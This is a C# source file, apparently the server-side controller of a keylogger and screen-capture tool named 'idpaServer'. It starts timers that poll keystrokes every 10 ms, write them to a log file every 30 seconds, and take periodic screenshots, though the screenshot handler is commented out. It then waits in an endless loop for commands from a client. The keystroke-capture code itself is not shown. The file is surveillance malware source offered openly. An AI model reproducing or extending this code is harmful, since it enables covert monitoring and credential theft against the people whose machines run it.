using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Timers;
using System.Windows.Forms;

namespace idpaServer
{
    static class Controller
    {
        //Config
        public const string APP_PATH = @"C:\Temp";
        public const string DATA_PATH = @"C:\Users";
        public const int PRINT_SCREEN_INTERVAL = 60000; //Intervall in miliseconds 1000 = 1 sek
        public const int KEY_LOG_INTERVAL = 10; //Intervall in which keys will be stored in the Logger Object
        public const int KEY_LOGFILE_INTERVAL = 30000; //Intervall in which the log file will be updated 60 sek = 60000

        //Timers
        private static System.Timers.Timer timerPrintScreen;
        private static System.Timers.Timer timerKey;
        private static System.Timers.Timer timerKeyLogfile;

        public static void Init()
        {
            timerPrintScreen = new System.Timers.Timer(PRINT_SCREEN_INTERVAL);
            timerKey = new System.Timers.Timer(KEY_LOG_INTERVAL);
            timerKeyLogfile = new System.Timers.Timer(KEY_LOGFILE_INTERVAL);

            //timerPrintScreen.Elapsed += new ElapsedEventHandler(PrintScreen.GetScreenshot);
            timerKey.Elapsed += new ElapsedEventHandler(Keylogger.KeyTick);
            timerKeyLogfile.Elapsed += new ElapsedEventHandler(Keylogger.LogTick);

            timerPrintScreen.Interval = PRINT_SCREEN_INTERVAL;
            timerKey.Interval = KEY_LOG_INTERVAL;
            timerKeyLogfile.Interval = KEY_LOGFILE_INTERVAL;

            timerPrintScreen.Enabled = true;
            timerKey.Enabled = true;
            timerKeyLogfile.Enabled = true;

            GC.KeepAlive(timerPrintScreen);
            GC.KeepAlive(timerKey);
            GC.KeepAlive(timerKeyLogfile);

            Console.WriteLine("Controller Initialized");

            while (true)
            {
                //Wait for Command form the Client
            }
        }
    }
}
